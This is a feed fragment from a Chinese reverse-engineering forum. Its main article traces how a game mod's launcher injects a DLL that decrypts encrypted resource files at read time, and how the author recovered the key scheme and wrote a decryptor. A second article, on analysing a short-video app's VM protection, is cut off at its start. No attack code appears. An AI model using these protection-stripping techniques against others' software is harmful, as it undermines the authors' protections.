src="https://wechat2rss.xlab.app/img-proxy/?k=3ba1f3f2&amp;u=https%3A%2F%2Fmmbiz.qpic.cn%2Fsz_mmbiz_png%2FLFPriaSjBUZIKG8FMgg6zibNIT7MjJ8piacboBMib43abAOA4U6y1Fem0jKcdicwx9wOEVSbdLVuwzpAJKjOJBugSAg%2F640%3Fwx_fmt%3Dpng%26from%3Dappmsg" style="cursor: pointer; border-width: 0px; border-color: initial; vertical-align: middle; width: auto;" width="225" /></p><p><br /></p><p>会不会只是后缀名被修改了？先拖进hex查看器中先看看情况。</p><p>这是big文件的情况：</p><p><img border="0" class="rich_pages wxw-img" src="https://wechat2rss.xlab.app/img-proxy/?k=13592a32&amp;u=https%3A%2F%2Fmmbiz.qpic.cn%2Fsz_mmbiz_png%2FLFPriaSjBUZIKG8FMgg6zibNIT7MjJ8piacrfjtPFlfJm2upaqGy7BhzeBZ2bg1icqxhwFTHMWBQcVukiaeZibvpTx1w%2F640%3Fwx_fmt%3Dpng%26from%3Dappmsg" style="cursor: pointer; border-width: 0px; border-color: initial; vertical-align: middle; width: auto;" width="1080" /></p><p><br /></p><p>可以很容易看出文件以 big4 标识开头。</p><p>这是lyi文件的情况：</p><p><img border="0" src="https://wechat2rss.xlab.app/img-proxy/?k=6e37a319&amp;u=https%3A%2F%2Fmmbiz.qpic.cn%2Fsz_mmbiz_png%2FLFPriaSjBUZIKG8FMgg6zibNIT7MjJ8piac7HXx0mxZhdKYBTQpnOA13fGF6Lf314ic6UWwWSuhjOjVKibJVb16ITjQ%2F640%3Fwx_fmt%3Dpng%26from%3Dappmsg" style="cursor: pointer; border-width: 0px; border-color: initial; vertical-align: middle; width: auto;" width="1060" /></p><p><br /></p><p>可以发现文件头与big文件完全不同，没有任何有用信息（看不出文件头）。</p><p>好家伙，格式完全不一样，怪不得我自己启动启动不了，这lyi文件游戏不认识啊。这可真是奇了怪了，他的启动器又是怎么让游戏加载的呢？</p><h2>寻找 co**na mod 哪一步修改了资源文件</h2><p>游戏本体不是开源的，游戏本身的资源加载解析逻辑很难被修改，所以必然是再启动游戏过程中某些过程被mod专用启动器动了手脚。当前便是要找出这个动手脚的地方。</p><p>由于启动游戏涉及了三个可执行文件，首先通过Process Monitor看看这三个文件再启动游戏的过程中是哪些进程读取了lyi文件。</p><p>首先添加过滤规则，防止事件过多难以阅读：</p><p><img border="0" src="https://wechat2rss.xlab.app/img-proxy/?k=ea633d31&amp;u=https%3A%2F%2Fmmbiz.qpic.cn%2Fsz_mmbiz_png%2FLFPriaSjBUZIKG8FMgg6zibNIT7MjJ8piacM2ibp9InkqPqCYibF88sHiacqbexJspSIs9QicLR8IIKepvVqPZsiaYp72Q%2F640%3Fwx_fmt%3Dpng%26from%3Dappmsg" style="cursor: pointer; border-width: 0px; border-color: initial; vertical-align: middle; width: auto;" width="759" /></p><p><br /></p><p>然后通过mod专用启动器启动游戏，开始捕获直到进入游戏主界面。</p><p><img border="0" class="rich_pages wxw-img" src="https://wechat2rss.xlab.app/img-proxy/?k=fef7722b&amp;u=https%3A%2F%2Fmmbiz.qpic.cn%2Fsz_mmbiz_png%2FLFPriaSjBUZIKG8FMgg6zibNIT7MjJ8piacYxSocNYico3oZrCV1FSoVmO6ZavR4lyMIuw6fVEawxQCjgn4bNFWa7A%2F640%3Fwx_fmt%3Dpng%26from%3Dappmsg" style="cursor: pointer; border-width: 0px; border-color: initial; vertical-align: middle; width: auto;" width="1080" /></p><p><br /></p><p>如图，<em style="color: rgb(102, 102, 102);">launcher.exe便是mod的专用启动器，</em>12.game是游戏本体，游戏自带的启动器并没有出现在捕获结果中。</p><p>通过捕获的内容发现，mod专用启动器只是打开lyi文件后查询了文件的信息，并没有读取文件内容，也没有修改文件内容。游戏本体则是打开lyi文件后进行了大量的读取，也没有修改lyi文件的内容。</p><p>这可真的是奇了怪了，好像游戏本体正常读取了lyi文件，mod专用启动器什么其他的事情也没有做。</p><p>于是可以断定，游戏本体exe被动了手脚。一个合理的猜想于是在我的脑海中诞生了，会不会是exe被dll注入了，加入了读取lyi文件的功能，才会出现上面的结果？</p><p>这很好验证，直接双击Process Monitor中的一条事件，弹出事件详情窗口，第二个进程选项卡中便列出了此时进程所加载的dll。甚至都不用打开Process Explorer。</p><p><img border="0" src="https://wechat2rss.xlab.app/img-proxy/?k=c6d53b84&amp;u=https%3A%2F%2Fmmbiz.qpic.cn%2Fsz_mmbiz_png%2FLFPriaSjBUZIKG8FMgg6zibNIT7MjJ8piac5y3Nx0hbVQNKjdFD9SOYK90xSfwPdWofRUO4WiaHZNhyuCAHz5kTOKA%2F640%3Fwx_fmt%3Dpng%26from%3Dappmsg" style="cursor: pointer; border-width: 0px; border-color: initial; vertical-align: middle; width: auto;" width="1080" /></p><p><br /></p><p>点击按path排序一下，映入眼帘的第一个便是一个叫lyi.dll的文件，文件目录正好在mod专用启动器的安装包下。这文件名起的，就是它了。</p><h2>分析 lyi.dll 的行为</h2><p>确定了目标后，接下来便是分析lyi.dll是如何在游戏进程内实现读取lyi文件的功能的。</p><p>通过上面的捕获结果可以发现，游戏反复读取了lyi资源文件（仅仅在加载游戏到进入游戏主界面，便有足足一万多次读取），并且在事件详情中也可以看出每次读取的文件位置和文件大小都是不相同的。如图：</p><p><img border="0" src="https://wechat2rss.xlab.app/img-proxy/?k=d67cb9c2&amp;u=https%3A%2F%2Fmmbiz.qpic.cn%2Fsz_mmbiz_png%2FLFPriaSjBUZIKG8FMgg6zibNIT7MjJ8piacFU1D283NvfTrFUzO0PjuXiaVVek6YYyicr7H1soJ6JylfydEmP5ibvROA%2F640%3Fwx_fmt%3Dpng%26from%3Dappmsg" style="cursor: pointer; border-width: 0px; border-color: initial; vertical-align: middle; width: auto;" width="1080" /></p><p><br /></p><p>我想，如果是将lyi文件直接读入内存，然后直接全部解密，不应该出现这样的调用。并且，mod资源文件本身就有近2GB大小，直接读入内存不是这个32位的游戏可以承受的，不会是这个方法。</p><p>分块读入解密也不太可能，因为每次读入的文件位置有前有后，读入的大小相差巨大（从几个字节到几个mb都有），如果是分块解密，应该是按顺序每次读入相同大小的内容，现在的情况反倒是像真的在读取游戏资源一样。</p><p>会不会是lyi.dll hook了游戏本身的读取资源函数，然后在游戏正常读取完内容后，再对内容进行修改呢？于是，我观察了ReadFile函数的调用栈，果然，ReadFile函数都是从游戏本体exe中发出的，而非lyi.dll。</p><p><img border="0" class="rich_pages wxw-img" src="https://wechat2rss.xlab.app/img-proxy/?k=7a7c93d1&amp;u=https%3A%2F%2Fmmbiz.qpic.cn%2Fsz_mmbiz_png%2FLFPriaSjBUZIKG8FMgg6zibNIT7MjJ8piacD3pPiaSa3gwWeJJYHQl1kesxoDrl9YvMq38y4YYNkaSMB0lxRMJlcvg%2F640%3Fwx_fmt%3Dpng%26from%3Dappmsg" style="cursor: pointer; border-width: 0px; border-color: initial; vertical-align: middle; width: auto;" width="1080" /></p><p><br /></p><p>如果是这样的话，lyi文件肯定是和原始的big文件一样大了。因为游戏本体并不知道自己读取的是lyi文件，还是按照big文件的偏移和大小来读取，那么如果lyi文件和原始的big文件不一样大，一切都乱套了。所以我猜想，lyi文件必然是在原始的big文件上对每一个字节经过某种运算得到的，比如说经典的xor。</p><h2>寻找 lyi.dll 的解密代码</h2><p>猜到了lyi.dll的大致做法，那么下面寻找解密代码就简单了。</p><p>打开x64dbg，选择32位版本，先将调试器附加到正在运行的游戏上，在symbols界面找到kernel32.dll，搜索File函数，将ReadFile与ReadFileEx断点。</p><p><img border="0" class="rich_pages wxw-img" src="https://wechat2rss.xlab.app/img-proxy/?k=9c28ee2b&amp;u=https%3A%2F%2Fmmbiz.qpic.cn%2Fsz_mmbiz_png%2FLFPriaSjBUZIKG8FMgg6zibNIT7MjJ8piacFR9vUooUgM1ibsic2Opn7M23hHkluOHF8m9bPpYicJhTUPCpF206f0xlg%2F640%3Fwx_fmt%3Dpng%26from%3Dappmsg" style="cursor: pointer; border-width: 0px; border-color: initial; vertical-align: middle; width: auto;" width="1080" /></p><p><br /></p><p>因为游戏在运行中不一定会读取资源，但在启动时一定会，所以重新启动游戏。</p><p>此时便会遇到一个问题，由于游戏加载的文件很多，并不只有mod资源文件，所以ReadFile的断点命中后，不一定就是我们所需要的，于是我这里用了一个笨方法：游戏启动时就需要播放mod资源文件中的启动视频，所以mod资源文件必定很早就被加载，每次命中断点后，我就在handles界面中搜索lyi文件的句柄是否已经存在，如果存在就记下它，并对<code style="font-family: SFMono-Regular, Consolas, ;">ReadFile</code>和<code style="font-family: SFMono-Regular, Consolas, ;">ReadFileEx</code>断点添加条件：</p><p><img border="0" src="https://wechat2rss.xlab.app/img-proxy/?k=6253905f&amp;u=https%3A%2F%2Fmmbiz.qpic.cn%2Fsz_mmbiz_png%2FLFPriaSjBUZIKG8FMgg6zibNIT7MjJ8piacdJx6bOSulGoDl3BwG4maYVcicvQgSXYaGtXBmtQZhUmL5vUbHxO8Gew%2F640%3Fwx_fmt%3Dpng%26from%3Dappmsg" style="cursor: pointer; border-width: 0px; border-color: initial; vertical-align: middle; width: auto;" width="1080" /></p><p><br /></p><p>这里句柄值是470， <code style="font-family: SFMono-Regular, Consolas, ;">ReadFile</code>的第一个参数是文件句柄，第一个参数位于<code style="font-family: SFMono-Regular, Consolas, ;">esp + 4</code>的位置，于是添加条件 <code style="font-family: SFMono-Regular, Consolas, ;">[esp + 4] == 470</code>。</p><p><img border="0" class="rich_pages wxw-img" src="https://wechat2rss.xlab.app/img-proxy/?k=fa8f817e&amp;u=https%3A%2F%2Fmmbiz.qpic.cn%2Fsz_mmbiz_png%2FLFPriaSjBUZIKG8FMgg6zibNIT7MjJ8piacOc06FPRzBusHm9dbKHQmgxMJeHqlXxCGDr7CUuahFAk3YFmSzYSHXA%2F640%3Fwx_fmt%3Dpng%26from%3Dappmsg" style="cursor: pointer; border-width: 0px; border-color: initial; vertical-align: middle; width: auto;" width="1080" /></p><p><br /></p><p>接下来，<code style="font-family: SFMono-Regular, Consolas, ;">ReadFile</code>中断便全是在读取lyi文件了。</p><p><img border="0" src="https://wechat2rss.xlab.app/img-proxy/?k=4a71a702&amp;u=https%3A%2F%2Fmmbiz.qpic.cn%2Fsz_mmbiz_png%2FLFPriaSjBUZIKG8FMgg6zibNIT7MjJ8piacXq9fibIvyTMRLWFbNwBS0plyibdws2J0tSnkSr4iap3Y1upnuibUkWfyrQ%2F640%3Fwx_fmt%3Dpng%26from%3Dappmsg" style="cursor: pointer; border-width: 0px; border-color: initial; vertical-align: middle; width: auto;" width="1080" /></p><p><br /></p><p><code style="font-family: SFMono-Regular, Consolas, ;">ReadFile</code>的第二个参数是缓冲区，第三个参数是读取的长度。因为资源文件很大，所以解密大概率是就地修改，所以在缓冲区指向的内存上打上写断点。</p><p>继续运行，代码停留在如下位置</p><p><img border="0" class="rich_pages wxw-img" src="https://wechat2rss.xlab.app/img-proxy/?k=77f7d768&amp;u=https%3A%2F%2Fmmbiz.qpic.cn%2Fsz_mmbiz_png%2FLFPriaSjBUZIKG8FMgg6zibNIT7MjJ8piacP3jk1y8vzRicsDMfohJsYoTAjZSQNasO0CNAge3hCzibdYyicicNL5BmiaA%2F640%3Fwx_fmt%3Dpng%26from%3Dappmsg" style="cursor: pointer; border-width: 0px; border-color: initial; vertical-align: middle; width: auto;" width="1080" /></p><p><br /></p><p>看得出来，此处是一个循环内部，通过观察与反复的单步执行发现：</p><ol><li style="margin-left: 2px;"><p><code style="font-family: SFMono-Regular, Consolas, ;">ecx</code>正好指向的是读取缓冲区，并且每次循环都会加一。</p></li><li style="margin-left: 2px;"><p><code style="font-family: SFMono-Regular, Consolas, ;">esi</code>在循环开始的值与<code style="font-family: SFMono-Regular, Consolas, ;">ReadFile</code>读取的长度相同，并且每次循环减少1。</p></li><li style="margin-left: 2px;"><p>循环体每循环一次，缓冲区便会修改一个字节，并且当读取的是lyi文件的文件头时，缓冲区会被修改为以 <span style="font-weight: 700;">big4</span> 开头。</p></li></ol><p>看来，这就是解密代码。</p><h2>分析 lyi.dll 的解密过程</h2><p>解密的核心代码便是这一段</p><p><img border="0" src="https://wechat2rss.xlab.app/img-proxy/?k=cca3cee1&amp;u=https%3A%2F%2Fmmbiz.qpic.cn%2Fsz_mmbiz_png%2FLFPriaSjBUZIKG8FMgg6zibNIT7MjJ8piacIEsa6DaFicq8c2y2zO0OZNFdmKGNNAtfIN414pMJaq6AMepIqtiaue7Q%2F640%3Fwx_fmt%3Dpng%26from%3Dappmsg" style="cursor: pointer; border-width: 0px; border-color: initial; vertical-align: middle; width: auto;" width="1080" /></p><p><br /></p><p>继续单步执行反复观察，可以注意到看到寄存器窗口出现了奇怪的字符串</p><p><img border="0" class="rich_pages wxw-img" src="https://wechat2rss.xlab.app/img-proxy/?k=10768515&amp;u=https%3A%2F%2Fmmbiz.qpic.cn%2Fsz_mmbiz_png%2FLFPriaSjBUZIKG8FMgg6zibNIT7MjJ8piacTLiarAQrhriaLI1S4LqhnfLFiaofEZH0Tu4403CBFOwPn4UYSFpzsHdOg%2F640%3Fwx_fmt%3Dpng%26from%3Dappmsg" style="cursor: pointer; border-width: 0px; border-color: initial; vertical-align: middle; width: auto;" width="1080" /></p><p><br /></p><p>该字符串的地址为 <code style="font-family: SFMono-Regular, Consolas, ;">eax + edi + 0x0c</code>，直接跟进内存，于是发现了一个长度为512的字符串</p><p><img border="0" src="https://wechat2rss.xlab.app/img-proxy/?k=90ce6d82&amp;u=https%3A%2F%2Fmmbiz.qpic.cn%2Fsz_mmbiz_png%2FLFPriaSjBUZIKG8FMgg6zibNIT7MjJ8piacMt1jvwMqIeYZqLUj9zu5jichzUaQkzQFWZo0dGRwNkic2vHqpRbSk0DQ%2F640%3Fwx_fmt%3Dpng%26from%3Dappmsg" style="cursor: pointer; border-width: 0px; border-color: initial; vertical-align: middle; width: auto;" width="1080" /></p><p><br /></p><p>可以发现，当<code style="font-family: SFMono-Regular, Consolas, ;">eax</code>为0时，<code style="font-family: SFMono-Regular, Consolas, ;">edi + 0x0c</code>正好指向了当前字符串的开头。并且无论哪一次读取lyi文件，程序停在此处，<code style="font-family: SFMono-Regular, Consolas, ;">edi + 0x0c</code>都指向该字符串。看来，这就是解密用的字符串了。</p><p>那么eax便是解密字符串当前使用的字符下标了，从 <code style="font-family: SFMono-Regular, Consolas, ;">and eax,1FF</code> 这句代码也可以印证这一点，解密字符串长度为512，0x1ff为511，正好可以防止下标溢出。</p><p>那么<code style="font-family: SFMono-Regular, Consolas, ;">eax</code>的值是如何确定的呢？继续向上看，<code style="font-family: SFMono-Regular, Consolas, ;">eax</code>是<code style="font-family: SFMono-Regular, Consolas, ;">edx + ecx</code>的结果，<code style="font-family: SFMono-Regular, Consolas, ;">ecx</code>的内容我们已经知道了，是指向文件内容缓冲区的指针，那<code style="font-family: SFMono-Regular, Consolas, ;">edx</code>呢？继续向上看可以发现edx是读取了栈上<code style="font-family: SFMono-Regular, Consolas, ;">esp + 20</code>的值，然后又减去edi的值。</p><p><img border="0" src="https://wechat2rss.xlab.app/img-proxy/?k=9d9eb3e4&amp;u=https%3A%2F%2Fmmbiz.qpic.cn%2Fsz_mmbiz_png%2FLFPriaSjBUZIKG8FMgg6zibNIT7MjJ8piaco4kyIiaa9wC1cPPOe8ngMD30JCUflWT5oKegJeyiabZ2omTGkFnwLw6g%2F640%3Fwx_fmt%3Dpng%26from%3Dappmsg" style="cursor: pointer; border-width: 0px; border-color: initial; vertical-align: middle; width: auto;" width="1080" /></p><p><br /></p><p>随后edi又被重新赋值为栈上<code style="font-family: SFMono-Regular, Consolas, ;">esp + 14</code>的内容，并且再也没有被修改。结合前面的分析结果，看来<code style="font-family: SFMono-Regular, Consolas, ;">esp + 14</code>的位置保存的是解密用符串所在的地址。</p><p>那edi原来存的是什么内容？继续观察可以发现这一句</p><p><img border="0" src="https://wechat2rss.xlab.app/img-proxy/?k=195be747&amp;u=https%3A%2F%2Fmmbiz.qpic.cn%2Fsz_mmbiz_png%2FLFPriaSjBUZIKG8FMgg6zibNIT7MjJ8piacibgyYnmqiaHJiaLHwEdML6NrtaiaF6lJMpJuuBibtYhafjvptpFWOao1bAQ%2F640%3Fwx_fmt%3Dpng%26from%3Dappmsg" style="cursor: pointer; border-width: 0px; border-color: initial; vertical-align: middle; width: auto;" width="969" /></p><p><br /></p><p><code style="font-family: SFMono-Regular, Consolas, ;">ecx</code>的值是edi赋值给它的。在下面的循环中，<code style="font-family: SFMono-Regular, Consolas, ;">ecx</code>指向了文件读取缓冲区，那么edi开始时必然也是指向了文件读取缓冲区。</p><p>当是到这里，我的大脑已经开始混乱了，这几个寄存器在这你赋值给我，我赋值给你干什么玩意呢？而且<code style="font-family: SFMono-Regular, Consolas, ;">eax</code>的值怎么和缓冲区指针扯上关系了，这缓冲区指针不是new出来的么？值应该是随机的啊？不对劲，赶紧再缕一缕，把表达式拆开来写看看：</p><p><code style="font-family: SFMono-Regular, Consolas, ;">eax = edx + ecx</code></p><p><code style="font-family: SFMono-Regular, Consolas, ;">eax = dex - edi + ecx</code></p><p>嗯？这个时候<code style="font-family: SFMono-Regular, Consolas, ;">ecx</code>不是等于<code style="font-family: SFMono-Regular, Consolas, ;">edi</code>么？一加一减抵消了，这<code style="font-family: SFMono-Regular, Consolas, ;">eax</code>的值就是一开始的<code style="font-family: SFMono-Regular, Consolas, ;">edx</code>，也就是<code style="font-family: SFMono-Regular, Consolas, ;">esp + 20</code>的内容。在下面的循环中，<code style="font-family: SFMono-Regular, Consolas, ;">ecx</code>每次循环都会被加1，所以<code style="font-family: SFMono-Regular, Consolas, ;">eax</code>的值每次循环也会被加一，这样就能在每次循环中使用解密字符串中下一个字符来解密了。</p><p><code style="font-family: SFMono-Regular, Consolas, ;">esp + 20</code>的内容又是啥？通过向上翻代码发现，<code style="font-family: SFMono-Regular, Consolas, ;">esp + 20</code>的值在本函数中没有被修改过，就是外界传进来的一个普通参数。难道需要向上查调用栈吗？这也太麻烦了。这<code style="font-family: SFMono-Regular, Consolas, ;">esp + 20</code>可能是什么呢？它影响了<code style="font-family: SFMono-Regular, Consolas, ;">eax</code>的初始值，也就是影响了一开始使用解密字符串的位置。</p><p>于是我猜，这个<code style="font-family: SFMono-Regular, Consolas, ;">esp + 20</code>一定和当前的文件指针有关，因为游戏读取文件的位置和大小是随机的，你不能保证游戏什么时候就加载什么文件，如果是其它值，那怎么解密呢？解密字符和原始字节不就对不上了吗？</p><p>为了证明这一点，给<code style="font-family: SFMono-Regular, Consolas, ;">SetFilePointer</code>和<code style="font-family: SFMono-Regular, Consolas, ;">SetFilePointerEx</code>打上断点。读文件前肯定要用到这两个函数设置读取位置。</p><p><img border="0" src="https://wechat2rss.xlab.app/img-proxy/?k=271b427e&amp;u=https%3A%2F%2Fmmbiz.qpic.cn%2Fsz_mmbiz_png%2FLFPriaSjBUZIKG8FMgg6zibNIT7MjJ8piacCjgK4weJnEWSicjnS42ibIHeAWURePR9CibJrCibvJYVm3XcyFJI3slmFQ%2F640%3Fwx_fmt%3Dpng%26from%3Dappmsg" style="cursor: pointer; border-width: 0px; border-color: initial; vertical-align: middle; width: auto;" width="1080" /></p><p><br /></p><p>然后让游戏继续运行，发现断点停在了<code style="font-family: SFMono-Regular, Consolas, ;">SetFilePointerEx</code>上面</p><p><img border="0" src="https://wechat2rss.xlab.app/img-proxy/?k=b992000e&amp;u=https%3A%2F%2Fmmbiz.qpic.cn%2Fsz_mmbiz_png%2FLFPriaSjBUZIKG8FMgg6zibNIT7MjJ8piacQ37HgChb6uZ4Ahn5g3tSRibSZH1cdaYwvAa0g60KZgqmRtViaNBRB98w%2F640%3Fwx_fmt%3Dpng%26from%3Dappmsg" style="cursor: pointer; border-width: 0px; border-color: initial; vertical-align: middle; width: auto;" width="1080" /></p><p><br /></p><p><code style="font-family: SFMono-Regular, Consolas, ;">esp + 0x08</code>是文件指针的低三十二位，<code style="font-family: SFMono-Regular, Consolas, ;">esp + 0x0c</code>是文件指针的高三十二位，高三十二位都是0，所以此时文件指针是<code style="font-family: SFMono-Regular, Consolas, ;">0x4B744AF7</code>。</p><p>继续运行：</p><p><img border="0" class="rich_pages wxw-img" src="https://wechat2rss.xlab.app/img-proxy/?k=5ec2b16c&amp;u=https%3A%2F%2Fmmbiz.qpic.cn%2Fsz_mmbiz_png%2FLFPriaSjBUZIKG8FMgg6zibNIT7MjJ8piacfeOCVkFJPOubVQZEl5RGZ6Wkxttetr4hd8prqoPUXdSbhJnGpgJX6w%2F640%3Fwx_fmt%3Dpng%26from%3Dappmsg" style="cursor: pointer; border-width: 0px; border-color: initial; vertical-align: middle; width: auto;" width="1080" /></p><p><br /></p><p>果然停在了<code style="font-family: SFMono-Regular, Consolas, ;">ReadFile</code>函数，此时参数三是<code style="font-family: SFMono-Regular, Consolas, ;">0x0FA3</code>，说明当前游戏读取了文件从<code style="font-family: SFMono-Regular, Consolas, ;">0x4B744AF7</code>处开始<code style="font-family: SFMono-Regular, Consolas, ;">0x0FA3</code>个字节。</p><p>继续运行：</p><p><img border="0" class="rich_pages wxw-img" src="https://wechat2rss.xlab.app/img-proxy/?k=798265e3&amp;u=https%3A%2F%2Fmmbiz.qpic.cn%2Fsz_mmbiz_png%2FLFPriaSjBUZIKG8FMgg6zibNIT7MjJ8piacWrRmzKUCctkN9kwBwibRHEEvgLojJn6Ex2Uv7m7hywa9wX3HPOLWz7w%2F640%3Fwx_fmt%3Dpng%26from%3Dappmsg" style="cursor: pointer; border-width: 0px; border-color: initial; vertical-align: middle; width: auto; display: inline;" width="1080" /></p><p><br /></p><p>程序停在刚才的解密代码处。一下子就可以看出来，<code style="font-family: SFMono-Regular, Consolas, ;">esp + 20</code>的值与刚才的文件指针一模一样，都是<code style="font-family: SFMono-Regular, Consolas, ;">0x4B744AF7</code>，<code style="font-family: SFMono-Regular, Consolas, ;">esi</code>的值与读取长度也都是<code style="font-family: SFMono-Regular, Consolas, ;">0x0FA3</code>。重复几次，结果都是如此，说明刚才的猜想是正确的。</p><p>总结一下，这个解密过程其实很简单。解密时，将当前要被解密的字节的位置与0x1ff按位与，得解密字符串使用的下标，然后将被解密字节加上这个解密字符，解密完成。</p><h2>编写解密程序</h2><p>知道了解密过程，解密程序的编写便十分容易，就是一个对每一个字节加上特定数值的过程。</p><p><img border="0" class="rich_pages wxw-img" src="https://wechat2rss.xlab.app/img-proxy/?k=247082bb&amp;u=https%3A%2F%2Fmmbiz.qpic.cn%2Fsz_mmbiz_png%2FLFPriaSjBUZIKG8FMgg6zibNIT7MjJ8piacC9PmdS7YoyT6Ie29SdjHl31FibzcicYiayAWa51nmvxRfZ5CqpeYII1uA%2F640%3Fwx_fmt%3Dpng%26from%3Dappmsg" style="cursor: pointer; border-width: 0px; border-color: initial; vertical-align: middle; width: auto;" width="1080" /></p><p><br /></p><h2>最后</h2><p>做完了这一切，是不是就可以脱离mod专用启动器玩mod了？我迫不及待的尝试了一下，发现还是不能。这是为什么？</p><p>我发现，mod专用启动器还向游戏注入了一个LuaBridge.dll的文件</p><p><br /></p><p>我猜想，游戏本身便支持lua脚本，这个dll应该是用于扩展lua脚本的功能，而mod中用到了这些扩展功能，所以还是离不开mod专用启动器。</p><p>但解密是成功的，游戏可以正常读取解密后文件的启动动画，并且游戏官方的big解包工具也可以正常提取音乐等美术资源。</p><p><img border="0" src="https://wechat2rss.xlab.app/img-proxy/?k=20a3588a&amp;u=https%3A%2F%2Fmmbiz.qpic.cn%2Fsz_mmbiz_png%2FLFPriaSjBUZIKG8FMgg6zibNIT7MjJ8piacMVcP90NQzMYYKsJ2lmln2ESg3gFc3IAL35GqDBJACFMG0laJicVxicWw%2F640%3Fwx_fmt%3Dpng%26from%3Dappmsg" style="cursor: pointer; border-width: 0px; border-color: initial; vertical-align: middle; width: auto;" width="1080" /></p><p style="line-height: normal; margin-bottom: 0px;"><br /></p><p style="margin-bottom: 0px; letter-spacing: 0.544px; color: rgb(53, 53, 53); text-align: start; background-color: rgb(255, 255, 255); line-height: 25.6px; font-family: Tahoma, Helvetica, SimSun, sans-serif;"><strong><span style="color: rgb(0, 176, 80);"><strong><span style="color: rgb(255, 255, 255); background-color: rgb(0, 176, 80);">-官方论坛</span></strong></span></strong><br /></p><p style="margin-top: 8px; margin-bottom: 0px; letter-spacing: 0.544px; text-align: start; background-color: rgb(255, 255, 255); color: rgb(53, 53, 53); font-size: 14px; font-family: Tahoma, Helvetica, SimSun, sans-serif; line-height: normal;"><span>www.52pojie.cn</span></p><p style="margin-top: 8px; margin-bottom: 0px; letter-spacing: 0.544px; text-align: start; background-color: rgb(255, 255, 255); color: rgb(53, 53, 53); font-size: 14px; font-family: Tahoma, Helvetica, SimSun, sans-serif; line-height: normal;"><span><br /></span></p><p></p><p style="margin-bottom: 0px; letter-spacing: 0.544px; text-indent: 0em; text-align: center; background-color: rgb(255, 255, 255); color: rgb(53, 53, 53); font-size: 14px; font-family: Tahoma, Helvetica, SimSun, sans-serif; line-height: normal;"><span style="background-color: rgb(255, 251, 0); letter-spacing: normal; font-size: 24px;"><strong><span style="color: rgb(0, 0, 0); font-family: Verdana, Arial, Tahoma; letter-spacing: 5px; text-align: start; background-color: rgb(255, 255, 255);">👆👆👆</span></strong></span><span style="background-color: rgb(255, 251, 0); font-size: 16px; letter-spacing: normal;"><strong><span style="text-align: start; font-family: Arial, sans-serif;"><span style="color: rgb(0, 0, 0); font-family: Verdana, Arial, Tahoma; font-size: 20px; letter-spacing: 5px; background-color: rgb(255, 255, 255);"></span><strong style="font-family: Tahoma, Helvetica, SimSun, sans-serif; letter-spacing: 0.544px;"></strong></span></strong></span></p><p><span style="letter-spacing: normal;"><span style="font-size: 16px;">公众号<span style="color: rgb(255, 0, 0);"><strong>设置“星标”，</strong></span>您</span><span style="font-size: 16px; color: rgb(255, 0, 0);"><strong>不会错过</strong></span><span style="font-size: 16px;">新的消息通知<span style="color: rgb(247, 49, 49); font-family: Arial, sans-serif; font-size: 13px; text-align: start;"></span></span></span></p><p><span style="letter-spacing: normal;"><span style="font-size: 16px;">如</span><strong style="font-size: 16px; letter-spacing: 0.544px;"><span style="color: rgb(255, 0, 0);">开放注册、精华文章和周边活动</span></strong><span style="font-size: 16px;">等公告</span></span></p><p><span style="letter-spacing: normal;"><span style="font-size: 16px;"><br /></span></span></p><p style="margin-bottom: 0px; letter-spacing: 0.544px; text-indent: 0em; text-align: center; background-color: rgb(255, 255, 255); color: rgb(53, 53, 53); font-size: 14px; font-family: Tahoma, Helvetica, SimSun, sans-serif; line-height: normal;"><img class="rich_pages wxw-img" /></p><p style="display: none;"></p>



<p><a href="https://www.52pojie.cn/thread-1939477-1-1.html">阅读原文</a></p>
]]></content:encoded>
<pubDate>Wed, 03 Jul 2024 18:52:19 +0800</pubDate>
</item>
<item>
<title>【Android 原创】某短视频虚拟机分析和还原</title>
<link>https://mp.weixin.qq.com/s?__biz=MjM5Mjc3MDM2Mw==&amp;mid=2651140757&amp;idx=1&amp;sn=bc87af356202c3dbe2122de83c028fd5&amp;chksm=bd50a2c18a272bd7d0740d009513bfca6b50388937ce72fee2a3a28d1c5c8d6bc62f16ce9bd3&amp;scene=58&amp;subscene=0</link>
<guid>https://mp.weixin.qq.com/s?__biz=MjM5Mjc3MDM2Mw==&amp;mid=2651140757&amp;idx=1&amp;sn=bc87af356202c3dbe2122de83c028fd5&amp;chksm=bd50a2c18a272bd7d0740d009513bfca6b50388937ce72fee2a3a28d1c5c8d6bc62f16ce9bd3&amp;scene=58&amp;subscene=0</guid>
<content:encoded><![CDATA[
<p>
原创 <span>吾爱pojie</span> <span>2024-07-02 10:49</span> <span style="display: inline-block;">北京</span>
</p>

<p>windows流行的时候，虚拟机保护是多人不敢碰的东西，pc的性能比移动端性能要高出不少，虚拟化和变异的代码多到令人发指，因此在加密保护强度上要比移动端要强很多很多，为了移动端App更好的体验移动端加密强度短时间内不会达到pc上的强度。</p>


<p style="margin-bottom: 0px; letter-spacing: 0.578px; text-align: center; margin-left: 8px; margin-right: 8px;">
<img src="https://wechat2rss.xlab.app/img-proxy/?k=ca359a6c&amp;u=https%3A%2F%2Fmmbiz.qpic.cn%2Fsz_mmbiz_jpg%2FLFPriaSjBUZINkZb7anSXe3x6WuxjA3B3lfC9KCbDbat7l7xxIfiagHeiaiaqXZV89U6z6ZnKVqPYjwLQMxCxlZc0g%2F0%3Fwx_fmt%3Djpeg" />
</p>

<p style="line-height: normal; margin-bottom: 0px;"><strong style="letter-spacing: 0.544px; background-color: rgb(255, 255, 255); text-align: start; font-size: 20px;"><span>作者</span></strong><strong style="letter-spacing: 0.544px; background-color: rgb(255, 255, 255); text-align: start; font-size: 20px;"><span>论</span></strong><strong style="letter-spacing: 0.544px; background-color: rgb(255, 255, 255); text-align: start; font-size: 20px;"><span>坛账号：</span>金罡</strong></p><p style="line-height: normal; margin-bottom: 0px;"><br /></p><p>在windows流行的时候，虚拟机保护是多人不敢碰的东西现在依然也是如此，pc的性能比移动端性能要高出不少，虚拟化和变异的代码多到令人发指，因此在加密保护强度上要比移动端要强很多很多，为了移动端App更好的体验(ANR率)移动端加密强度短时间内不会达到pc上的强度，随着移动cpu性能越来越好相信加密强度会逐年加强。</p><p>早年兴趣使然分析研究过windows端VMProtect、Safengine Shielden、Themida、VProtect、Enigma Protector等等虚拟机，最近发现国内流行的短视频也有虚拟机加密同时也比较感兴趣，便开始了我的分析之旅。</p><p>分析任何虚拟机必须要扣汇编指令级细节。</p><p>安卓诞生这么多年了至今没有像windows端olldbg、x64dbg那样友好的调试器，IDA 